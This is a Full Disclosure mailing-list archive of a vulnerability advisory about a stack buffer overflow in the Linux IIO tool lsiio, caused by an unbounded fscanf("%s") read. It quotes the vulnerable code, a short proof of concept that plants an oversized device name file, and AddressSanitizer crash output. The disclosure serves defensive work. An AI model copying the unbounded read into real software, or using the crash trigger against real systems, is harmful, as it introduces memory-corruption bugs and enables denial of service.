---
title: WireGuard-Linux Stack-Based Buffer Overflow in lsiio (Linux IIO Userspace Tool) Due to Unbounded fscanf
url: https://seclists.org/fulldisclosure/2026/Sep/17
source: Full Disclosure
date: 2026-09-04
fetch_date: 2026-09-05T06:30:34.169793
---

# WireGuard-Linux Stack-Based Buffer Overflow in lsiio (Linux IIO Userspace Tool) Due to Unbounded fscanf

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](16)
[By Date](date.html#17)
[![Next](/images/right-icon-16x16.png)](18)

[![Previous](/images/left-icon-16x16.png)](16)
[By Thread](index.html#17)
[![Next](/images/right-icon-16x16.png)](18)

![](/shared/images/nst-icons.svg#search)

# WireGuard-Linux Stack-Based Buffer Overflow in lsiio (Linux IIO Userspace Tool) Due to Unbounded fscanf

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Sun, 30 Aug 2026 19:49:32 -0400

---

```
*Description:*
A stack-based buffer overflow exists in the Linux Industrial I/O (IIO)
userspace utility lsiio. The vulnerability occurs in the
find_type_by_name() function, where the program reads an unbounded string
from a filesystem-backed attribute into a fixed-size stack buffer using
fscanf("%s", ...).
If a crafted or oversized attribute value is present, the unbounded read
causes a write beyond the bounds of the destination stack buffer, resulting
in stack memory corruption.

*Affected Component:*

   - Project: Linux kernel userspace tools
   - Component: tools/iio/lsiio
   - Source file: tools/iio/iio_utils.c (compiled via iio_utils-in.c)
   - Function: find_type_by_name()

*Attack Vector:*

   - Local
   - An attacker who can influence the contents of the filesystem
   attributes read by lsiio (e.g., via a crafted sysfs-like directory or
   malicious environment) can trigger the overflow.

*Vulnerable Code:*
The vulnerable code performs an unbounded string read:
char name[IIO_MAX_NAME_LENGTH];
...
fscanf(namefp, "%s", name);

*Impact:*
Denial of Service: The application crashes reliably due to stack corruption.
Memory Corruption: Stack memory is overwritten, which may be exploitable
depending on build configuration, compiler protections, and runtime
environment. Although the issue is triggered locally, lsiio is shipped with
multiple Linux distributions as part of kernel userspace tooling, and the
vulnerable code executes prior to any bounds validation.

*Proof of Concept:*
# python3 -c 'print("A" * 4096)' > /tmp/iio/devices/iio:device0/name
# wc -c /tmp/iio/devices/iio:device0/name
4097 /tmp/iio/devices/iio:device0/name

*Output:*

# ./lsiio
=================================================================
==169698==ERROR: AddressSanitizer: stack-buffer-overflow on address
0xfbff91900060 at pc 0xaaaabaf3fb10 bp 0xfffff130c8d0 sp 0xfffff130c0a8
WRITE of size 4097 at 0xfbff91900060 thread T0
    #0 0xaaaabaf3fb0c  (/root/wireguard-linux/tools/iio/lsiio+0x5fb0c)
(BuildId: 6e2b994e1a38e5b227745ec0d1360f58d96f0846)
    #1 0xaaaabaf40a04  (/root/wireguard-linux/tools/iio/lsiio+0x60a04)
(BuildId: 6e2b994e1a38e5b227745ec0d1360f58d96f0846)
    #2 0xaaaabb00d3d4  (/root/wireguard-linux/tools/iio/lsiio+0x12d3d4)
(BuildId: 6e2b994e1a38e5b227745ec0d1360f58d96f0846)
    #3 0xaaaabb002b04  (/root/wireguard-linux/tools/iio/lsiio+0x122b04)
(BuildId: 6e2b994e1a38e5b227745ec0d1360f58d96f0846)
    #4 0xaaaabb0021fc  (/root/wireguard-linux/tools/iio/lsiio+0x1221fc)
(BuildId: 6e2b994e1a38e5b227745ec0d1360f58d96f0846)
    #5 0xaaaabb001ec0  (/root/wireguard-linux/tools/iio/lsiio+0x121ec0)
(BuildId: 6e2b994e1a38e5b227745ec0d1360f58d96f0846)
    #6 0xffff93982598  (/lib/aarch64-linux-gnu/libc.so.6+0x22598) (BuildId:
7544444e7eeafbb5a7ecaf94fc3ebebd2b986846)
    #7 0xffff93982678  (/lib/aarch64-linux-gnu/libc.so.6+0x22678) (BuildId:
7544444e7eeafbb5a7ecaf94fc3ebebd2b986846)
    #8 0xaaaabaf1b26c  (/root/wireguard-linux/tools/iio/lsiio+0x3b26c)
(BuildId: 6e2b994e1a38e5b227745ec0d1360f58d96f0846)

Address 0xfbff91900060 is located in stack of thread T0 at offset 96 in
frame
    #0 0xaaaabb0027b0  (/root/wireguard-linux/tools/iio/lsiio+0x1227b0)
(BuildId: 6e2b994e1a38e5b227745ec0d1360f58d96f0846)

Ron Edgerson
Vulnerability Researcher & Exploit Developer

CVE Research | Binary Exploitation | Application & Systems Security
Responsible Disclosure • Proof-of-Concept Development

🌐 https://github.com/ob1sec
🔗 https://www.linkedin.com/in/ronedgerson1
<https://linkedin.com/in/yourhandle>
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](16)
[By Date](date.html#17)
[![Next](/images/right-icon-16x16.png)](18)

[![Previous](/images/left-icon-16x16.png)](16)
[By Thread](index.html#17)
[![Next](/images/right-icon-16x16.png)](18)

### Current thread:

* **WireGuard-Linux Stack-Based Buffer Overflow in lsiio (Linux IIO Userspace Tool) Due to Unbounded fscanf** *Ron E (Sep 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")